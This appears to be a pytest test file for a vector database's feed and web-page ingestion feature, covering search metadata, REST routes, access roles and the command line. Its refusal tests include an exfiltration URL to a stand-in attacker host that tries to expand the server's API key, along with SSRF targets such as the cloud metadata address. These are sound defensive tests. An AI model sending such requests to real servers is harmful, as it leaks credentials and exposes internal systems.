"""Sources through a real collection, the REST routes and the command line.

The network is a fake, a resolver and a connection answering from a dict, as
in test_sources.py. The collections are real and on a temporary disk, so what
is checked here is what a search, a citation and lineage see.
"""

from __future__ import annotations

import os

import pytest

from vectrixdb import Vectrix
from vectrixdb._fetch import Fetcher
from vectrixdb.signin import roles
from vectrixdb.signin.records import SqlRecords
from vectrixdb.sources import ITEM, SOURCE, Sources, local_store

feedparser = pytest.importorskip("feedparser")

PUBLIC = "93.184.216.34"
FEED = "https://news.example.com/feed.xml"
RSS_TYPE = {"content-type": "application/rss+xml; charset=utf-8"}
TOKEN = "s3cr3t-feed-token"


def rss(*items):
    parts = []
    for item in items:
        parts.append(
            "<item>"
            f"<title>{item['title']}</title>"
            f"<link>{item['link'].replace('&', '&amp;')}</link>"
            f'<guid isPermaLink="false">{item["guid"]}</guid>'
            + (f"<pubDate>{item['date']}</pubDate>" if item.get("date") else "")
            + (f"<dc:creator>{item['author']}</dc:creator>" if item.get("author") else "")
            + f"<content:encoded><![CDATA[{item['html']}]]></content:encoded></item>"
        )
    return (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" '
        'xmlns:content="http://purl.org/rss/1.0/modules/content/">'
        "<channel><title>Example News</title><link>https://news.example.com/</link>"
        + "".join(parts)
        + "</channel></rss>"
    ).encode()


RATES = {
    "guid": "rates-1",
    "title": "Rates rise",
    "link": "https://news.example.com/rates?utm_source=rss&token=abc123",
    "date": "Tue, 06 Oct 2026 10:00:00 GMT",
    "author": "Ama Mensah",
    "html": "<p>The central bank raised its interest rate by a quarter point.</p>"
    "<p>Inflation is the reason given.</p>",
}
BRIDGE = {
    "guid": "bridge-1",
    "title": "Bridge opens",
    "link": "https://news.example.com/bridge",
    "date": "Mon, 05 Oct 2026 08:00:00 GMT",
    "html": "<p>The new bridge across the river opened to traffic on Monday.</p>",
}


class FakeWeb:
    """Every host resolves to a public address unless told otherwise; every address answers from a dict."""

    def __init__(self, pages=None, dns=None):
        self.pages = dict(pages or {})
        self.dns = dict(dns or {})
        self.requests = []

    def resolve(self, host, port):
        return self.dns.get(host, [PUBLIC])

    def open(self, request):
        self.requests.append(request)
        answer = self.pages.get(request.url)
        if answer is None:
            return 404, {"content-type": "text/plain"}, b"not here"
        return answer(request) if callable(answer) else answer

    def fetcher(self):
        return Fetcher(resolver=self.resolve, opener=self.open, proxies={}, sleep=lambda s: None)


@pytest.fixture
def clean_env(monkeypatch):
    """No server setting of the machine running the tests, and no proxy."""
    for name in [n for n in os.environ if n.startswith("VECTRIXDB_")]:
        monkeypatch.delenv(name)
    for name in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY"):
        monkeypatch.delenv(name, raising=False)


@pytest.fixture
def web():
    return FakeWeb({FEED: (200, RSS_TYPE, rss(RATES, BRIDGE))})


# ============================================================================
# IN A COLLECTION
# ============================================================================


@pytest.fixture
def news(tmp_path, web, clean_env):
    db = Vectrix("news", path=str(tmp_path))
    db.sources.fetcher = web.fetcher()
    yield db
    db.close()


class TestInACollection:
    def test_entries_are_searched_with_their_title_link_author_and_dates(self, news):
        news.sources.add(FEED, every="6h")
        report = news.sources.refresh()
        assert report.ok and len(report.added) == 2, report.to_dict()
        hit = news.search("central bank interest rate", limit=1)[0]
        meta = hit.metadata
        assert meta["title"] == "Rates rise" and meta["author"] == "Ama Mensah"
        assert meta["published"] == "2026-10-06T10:00:00Z"
        assert meta["source_kind"] == "feed" and meta["source_address"] == FEED
        assert meta["link"] == "https://news.example.com/rates?utm_source=rss", (
            "the token in the entry's link is not kept"
        )
        assert meta["_vx_doc"] == "https://news.example.com/rates", (
            "nor the click tracking in its id"
        )
        assert hit.citation.startswith("Rates rise")
        assert "abc123" not in str(meta) and "abc123" not in hit.citation

    def test_lineage_names_the_entry_without_its_secret(self, news):
        news.sources.add(FEED)
        news.sources.refresh()
        hit = news.search("central bank interest rate", limit=1)[0]
        (where,) = news.provenance(hit.id)
        assert where.document_id == "https://news.example.com/rates"
        assert where.source == "https://news.example.com/rates?utm_source=rss"
        assert where.document_version == hit.metadata["_vx_doc_version"]

    def test_a_changed_entry_replaces_every_chunk_of_the_last_version(self, news, web):
        long = "".join(
            f"<p>Paragraph {i} of the budget statement covers spending on schools, roads, clinics "
            f"and the cost of borrowing in the years ahead, item {i}.</p>"
            for i in range(60)
        )
        web.pages[FEED] = (
            200,
            RSS_TYPE,
            rss({**BRIDGE, "guid": "budget", "title": "Budget", "html": long}),
        )
        news.sources.add(FEED)
        news.sources.refresh()
        first = news.count()
        assert first > 2
        web.pages[FEED] = (
            200,
            RSS_TYPE,
            rss(
                {
                    **BRIDGE,
                    "guid": "budget",
                    "title": "Budget",
                    "html": "<p>The budget was withdrawn.</p>",
                }
            ),
        )
        report = news.sources.refresh(force=True)
        assert len(report.updated) == 1 and not report.added
        assert news.count() == 1, "nothing of the longer version is left behind"
        assert "withdrawn" in news.search("budget withdrawn", limit=1)[0].text

    def test_nothing_is_written_when_nothing_changed(self, news, web):
        news.sources.add(FEED)
        news.sources.refresh()
        build = news.search("bridge", limit=1)[0].metadata["_vx_build"]
        again = news.sources.refresh(force=True)
        assert again.unchanged == 2 and not again.added and not again.updated
        assert news.search("bridge", limit=1)[0].metadata["_vx_build"] == build

    def test_clear_keeps_the_sources_and_the_next_refresh_writes_everything_again(self, news):
        news.sources.add(FEED)
        news.sources.refresh()
        news.clear()
        assert news.count() == 0
        assert [s.address for s in news.sources.list()] == [FEED]
        report = news.sources.refresh()
        assert len(report.added) == 2 and news.count() == 2

    def test_deleting_the_collection_forgets_its_sources(self, tmp_path, news):
        news.sources.add(FEED)
        news.sources.refresh()
        news.close()
        from vectrixdb import VectrixDB

        database = VectrixDB(path=str(tmp_path))
        database.delete_collection("news")
        database.close()
        made_again = Vectrix("news", path=str(tmp_path))
        try:
            assert made_again.sources.list() == []
        finally:
            made_again.close()
        store = local_store(tmp_path)
        try:
            assert list(store.query(SOURCE)) == [] and list(store.query(ITEM)) == []
        finally:
            store.close()

    def test_a_secret_read_from_the_environment_is_sent_and_never_kept(
        self, news, web, monkeypatch
    ):
        monkeypatch.setenv("FEED_TOKEN", TOKEN)
        web.pages[f"{FEED}?key={TOKEN}"] = web.pages.pop(FEED)
        info = news.sources.add(FEED + "?key=${FEED_TOKEN}")
        assert info.address == FEED, "shown without the parameter that is only a name"
        report = news.sources.refresh()
        assert len(report.added) == 2
        assert web.requests[-1].url.endswith(f"key={TOKEN}"), "the value is what is sent"
        hit = news.search("bridge", limit=1)[0]
        assert TOKEN not in str(hit.metadata) and TOKEN not in str(report.to_dict())
        assert TOKEN not in str([s.to_dict() for s in news.sources.list()])


# ============================================================================
# OVER REST
# ============================================================================

KEY = "the-full-api-key"
READ_ONLY = "the-read-only-key"
SITE = "https://vectors.example.test"


@pytest.fixture
def serve(tmp_path, web, clean_env, monkeypatch):
    """A server on the temporary disk, its sources fetched through the fake web."""
    from fastapi.testclient import TestClient

    from vectrixdb.api import server
    from vectrixdb.policy import Overlap, Policy

    Vectrix("news", path=str(tmp_path)).close()
    Vectrix("walled", path=str(tmp_path), policy=Policy([Overlap("client_id", "clients")])).close()
    opened = []

    def build(**given):
        for key, value in given.pop("env", {}).items():
            monkeypatch.setenv(key, value)
        app = server.create_app(db_path=str(tmp_path), enable_dashboard=False, **given)
        app.state.sources_fetcher = web.fetcher()
        client = TestClient(app, base_url=SITE)
        client.__enter__()
        opened.append(client)
        return client

    yield build
    for client in opened:
        client.__exit__(None, None, None)


def add(client, address=FEED, collection="news", headers=None, **body):
    return client.post(
        f"/api/v1/collections/{collection}/sources",
        json={"address": address, **body},
        headers=headers,
    )


class TestOverRest:
    def test_add_list_refresh_and_remove(self, serve):
        client = serve()
        added = add(client, every="1h")
        assert added.status_code == 200, added.text
        source = added.json()["source"]
        assert source["kind"] == "feed" and source["every"] == "1h" and source["address"] == FEED

        listed = client.get("/api/v1/collections/news/sources").json()["sources"]
        assert [s["id"] for s in listed] == [source["id"]]

        refreshed = client.post("/api/v1/collections/news/sources/refresh")
        assert refreshed.status_code == 200, refreshed.text
        report = refreshed.json()
        assert report["ok"] and report["added"] == 2 and report["failed"] == []
        assert sorted(report["sources"][0]["added"]) == [
            "https://news.example.com/bridge",
            "https://news.example.com/rates",
        ]
        hits = client.post(
            "/api/v1/collections/news/text-search",
            json={"query_text": "central bank interest rate", "limit": 1},
        ).json()
        top = (hits.get("data") or hits)["results"][0]["metadata"]
        assert top["title"] == "Rates rise" and top["source_id"] == source["id"]
        assert "abc123" not in str(top)

        again = client.post("/api/v1/collections/news/sources/refresh", json={"force": True}).json()
        assert again["unchanged"] == 2 and again["added"] == 0

        removed = client.delete(f"/api/v1/collections/news/sources/{source['id']}")
        assert removed.status_code == 200 and removed.json()["documents_deleted"] is False
        assert client.get("/api/v1/collections/news/sources").json()["sources"] == []
        assert client.get("/api/v1/collections/news").json()["data"]["count"] == 2, (
            "its documents stay unless asked"
        )
        assert client.delete(f"/api/v1/collections/news/sources/{source['id']}").status_code == 404

    def test_removing_with_its_documents(self, serve):
        client = serve()
        sid = add(client).json()["source"]["id"]
        client.post("/api/v1/collections/news/sources/refresh")
        gone = client.delete(
            f"/api/v1/collections/news/sources/{sid}", params={"delete_documents": True}
        )
        assert gone.status_code == 200 and gone.json()["documents_deleted"] is True
        assert client.get("/api/v1/collections/news").json()["data"]["count"] == 0

    def test_a_page_is_told_from_a_feed_by_what_it_answers(self, serve, web):
        web.pages["https://news.example.com/pricing"] = (
            200,
            {"content-type": "text/html; charset=utf-8"},
            b"<html><body><main><h1>Pricing</h1><p>The plan costs $10 a month.</p></main></body></html>",
        )
        client = serve()
        reply = add(client, "https://news.example.com/pricing")
        assert reply.status_code == 200 and reply.json()["source"]["kind"] == "page"

    @pytest.mark.parametrize(
        "address, status",
        [
            ("https://news.example.com/feed.xml?token=" + TOKEN, 400),
            ("https://reader:" + TOKEN + "@news.example.com/feed.xml", 400),
            ("ftp://news.example.com/feed.xml", 422),
            ("http://10.1.2.3/feed.xml", 422),
            ("http://169.254.169.254/latest/meta-data/", 422),
            ("http://[::1]/feed.xml", 422),
            ("https://intranet.example.com/feed.xml", 422),
        ],
    )
    def test_what_is_refused_before_anything_is_kept(self, serve, web, address, status):
        web.dns["intranet.example.com"] = ["10.0.0.5"]
        client = serve()
        reply = add(client, address, kind="feed")
        if address.startswith("ftp:"):
            # The model refuses it before the route: a feed is fetched over http or https.
            assert reply.status_code in (400, 422), reply.text
        else:
            assert reply.status_code == status, reply.text
        assert TOKEN not in reply.text
        assert client.get("/api/v1/collections/news/sources").json()["sources"] == []

    def test_an_address_that_reads_the_environment_is_refused_over_the_api(
        self, serve, monkeypatch
    ):
        monkeypatch.setenv("VECTRIXDB_API_KEY_COPY", "x")
        client = serve()
        reply = add(client, "https://attacker.example.net/collect?k=${VECTRIXDB_API_KEY}")
        assert (
            reply.status_code == 400 and "from Python or the command line" in reply.json()["detail"]
        )

    def test_a_secret_kept_from_python_is_never_shown_over_rest(
        self, tmp_path, serve, web, monkeypatch
    ):
        monkeypatch.setenv("FEED_TOKEN", TOKEN)
        web.pages[f"{FEED}?key={TOKEN}"] = web.pages.pop(FEED)
        db = Vectrix("news", path=str(tmp_path))
        db.sources.fetcher = web.fetcher()
        db.sources.add(FEED + "?key=${FEED_TOKEN}")
        db.close()
        client = serve()
        refreshed = client.post("/api/v1/collections/news/sources/refresh")
        assert refreshed.json()["added"] == 2, refreshed.text
        listed = client.get("/api/v1/collections/news/sources")
        assert listed.json()["sources"][0]["address"] == FEED
        for reply in (refreshed, listed):
            assert TOKEN not in reply.text

    def test_a_failure_is_in_the_report_and_the_rest_goes_on(self, serve, web):
        web.pages["https://down.example.org/feed.xml"] = (
            500,
            {"content-type": "text/plain"},
            b"oops",
        )
        web.pages["https://busy.example.org/feed.xml"] = (503, {"retry-after": "120"}, b"busy")
        client = serve()
        add(client)
        add(client, "https://down.example.org/feed.xml", kind="feed")
        add(client, "https://busy.example.org/feed.xml", kind="feed")
        report = client.post("/api/v1/collections/news/sources/refresh").json()
        assert report["ok"] is False and report["added"] == 2
        assert [f["source"] for f in report["failed"]] == ["https://down.example.org/feed.xml"]
        assert "500" in report["failed"][0]["reason"]
        assert [d["source"] for d in report["deferred"]] == ["https://busy.example.org/feed.xml"], (
            "a site that asked for time is put off, not failed"
        )

    def test_an_unknown_source_to_refresh_is_a_404_and_a_bad_body_a_422(self, serve):
        client = serve()
        assert (
            client.post(
                "/api/v1/collections/news/sources/refresh", json={"source": "nope"}
            ).status_code
            == 404
        )
        assert (
            client.post(
                "/api/v1/collections/news/sources/refresh", json={"max_items": 0}
            ).status_code
            == 422
        )
        assert add(client, kind="video").status_code == 422
        assert add(client, every="1s").status_code == 400

    def test_a_how_often_past_a_year_or_past_any_number_is_a_400_and_the_list_still_reads(
        self, serve
    ):
        client = serve()
        endless = client.post(
            "/api/v1/collections/news/sources",
            content=f'{{"address": "{FEED}", "every": 1e309}}',
            headers={"content-type": "application/json"},
        )
        assert endless.status_code == 400, endless.text
        assert add(client, every=1e12).status_code == 400
        assert add(client, every="100w").status_code == 400
        listed = client.get("/api/v1/collections/news/sources")
        assert listed.status_code == 200 and listed.json()["sources"] == []

    def test_a_collection_with_an_entitlement_policy_or_none_at_all_is_refused(self, serve):
        client = serve()
        assert add(client, collection="walled").status_code == 403
        assert client.get("/api/v1/collections/nowhere/sources").status_code == 404

    def test_sources_are_kept_in_the_collection_store_every_server_reads(self, tmp_path, serve):
        from vectrixdb.collection_records import CollectionRecords

        shared = SqlRecords.sqlite(tmp_path / "shared" / "collections.db")
        client = serve(collection_store=CollectionRecords(shared, fresh_for=0))
        assert add(client).status_code == 200
        client.post("/api/v1/collections/news/sources/refresh")
        assert [r.data["address"] for r in shared.query(SOURCE, ix1="news")] == [FEED]
        assert len(list(shared.query(ITEM))) == 2
        own = local_store(tmp_path)
        try:
            assert list(own.query(SOURCE)) == [], "nothing in the server's own file"
        finally:
            own.close()

    def test_a_read_only_key_lists_and_the_full_key_changes(self, serve):
        client = serve(env={"VECTRIXDB_API_KEY": KEY, "VECTRIXDB_READ_ONLY_API_KEY": READ_ONLY})
        assert add(client, headers={"api-key": READ_ONLY}).status_code == 403
        assert add(client, headers={"api-key": KEY}).status_code == 200
        listed = client.get("/api/v1/collections/news/sources", headers={"api-key": READ_ONLY})
        assert listed.status_code == 200 and len(listed.json()["sources"]) == 1
        assert (
            client.post(
                "/api/v1/collections/news/sources/refresh", headers={"api-key": READ_ONLY}
            ).status_code
            == 403
        )
        assert add(client).status_code == 401


SECRET = "k" * 48


@pytest.fixture
def signed_in(tmp_path, serve):
    """Sign-in on, an access log, the full key, and the people store to make named keys in."""
    from vectrixdb.signin import SignInConfig

    config = SignInConfig(
        methods=("email",),
        secrets=(SECRET,),
        public_url=SITE,
        users=(("ada@example.com", "admin"),),
        store_path=tmp_path / "auth" / "signin.db",
        access_log=tmp_path / "auth" / "access.jsonl",
        sender=lambda to, subject, text: None,
    )
    return serve(signin=config, env={"VECTRIXDB_API_KEY": KEY})


class TestWhoMay:
    @pytest.mark.parametrize(
        "method, path, action",
        [
            ("GET", "/api/v1/collections/news/sources", "content.index"),
            ("POST", "/api/v1/collections/news/sources", "content.write"),
            ("POST", "/api/v1/collections/news/sources/refresh", "content.write"),
            ("DELETE", "/api/v1/collections/news/sources/3f2a9c1b7d4e", "content.write"),
            ("GET", "/api/collections/news/sources/", "content.index"),
        ],
    )
    def test_each_route_names_its_action(self, method, path, action):
        assert roles.action_for(method, path) == action

    def test_readers_and_viewers_list_operators_and_admins_change(self):
        for role in (roles.VIEWER, roles.READER, roles.SEARCHER, roles.OPERATOR, roles.ADMIN):
            assert roles.can(role, "content.index")
        for role in (roles.OPERATOR, roles.ADMIN):
            assert roles.can(role, "content.write")
        for role in (roles.VIEWER, roles.READER, roles.SEARCHER, roles.GUEST):
            assert not roles.can(role, "content.write")

    def test_named_keys_get_their_role_and_every_change_is_in_the_access_log(self, signed_in):
        client = signed_in
        store = client.app.state.signin.store
        _, operator = store.create_key("scheduler", "operator", None)
        _, reader = store.create_key("dashboard", "reader", None)
        _, searcher = store.create_key("app", "searcher", None)

        assert add(client, headers={"api-key": searcher}).status_code == 403
        assert add(client, headers={"api-key": reader}).status_code == 403
        assert add(client, headers={"api-key": operator}).status_code == 200
        assert (
            client.get("/api/v1/collections/news/sources", headers={"api-key": reader}).status_code
            == 200
        )
        refreshed = client.post(
            "/api/v1/collections/news/sources/refresh", headers={"api-key": operator}
        )
        assert refreshed.status_code == 200 and refreshed.json()["added"] == 2

        logged = client.get(
            "/api/v1/access", params={"limit": 1000}, headers={"api-key": KEY}
        ).json()["data"]["records"]
        routes = {(r.get("who"), r.get("route")) for r in logged}
        assert ("key:scheduler", "POST /api/v1/collections/news/sources") in routes
        assert ("key:scheduler", "POST /api/v1/collections/news/sources/refresh") in routes
        assert ("key:dashboard", "GET /api/v1/collections/news/sources") in routes
        assert TOKEN not in str(logged)


# ============================================================================
# ON THE COMMAND LINE
# ============================================================================


@pytest.fixture
def cli(tmp_path, web, clean_env, monkeypatch):
    """The command, its console wide, every fetch through the fake web."""
    from rich.console import Console
    from typer.testing import CliRunner

    import vectrixdb.cli
    from vectrixdb.cli import app

    monkeypatch.setattr(vectrixdb.cli, "console", Console(width=240))
    monkeypatch.setattr(Sources, "_new_fetcher", lambda self: web.fetcher())
    runner = CliRunner()
    where = str(tmp_path / "db")

    def run(*args):
        result = runner.invoke(app, ["sources", *args, "--path", where])
        return result.exit_code, " ".join(result.output.split())

    return run


class TestOnTheCommandLine:
    def test_add_list_refresh_and_remove(self, cli):
        code, said = cli("add", FEED, "--name", "news", "--every", "2h")
        assert code == 0 and "added the feed https://news.example.com/feed.xml" in said, said
        assert "read every 2h" in said

        code, said = cli("list", "--name", "news")
        assert code == 0 and FEED in said and "not read yet" in said

        code, said = cli("refresh")
        assert (
            code == 0 and "news: https://news.example.com/feed.xml: refreshed, 2 added" in said
        ), said

        code, said = cli("refresh", "--name", "news")
        assert code == 0 and "news: nothing due: 1 source not due yet" in said, said

        code, said = cli("refresh", "--name", "news", "--force")
        assert code == 0 and "2 unchanged" in said, said

        code, said = cli("remove", FEED, "--name", "news")
        assert code == 0 and "its documents stay" in said
        assert cli("remove", FEED, "--name", "news")[0] == 1

    def test_a_refresh_with_a_failure_exits_1_for_the_scheduler(self, cli, web):
        web.pages["https://down.example.org/page"] = (500, {"content-type": "text/html"}, b"oops")
        cli("add", "https://down.example.org/page", "--name", "news", "--kind", "page")
        code, said = cli("refresh", "--name", "news")
        assert code == 1 and "500" in said, said

    def test_an_address_with_a_password_in_it_is_refused_and_not_repeated(self, cli):
        code, said = cli(
            "add", f"https://reader:{TOKEN}@news.example.com/feed.xml", "--name", "news"
        )
        assert code == 2 and "${NAME}" in said and TOKEN not in said

    def test_nothing_to_refresh(self, cli):
        assert cli("refresh") == (0, "No collection here keeps up with a source.")
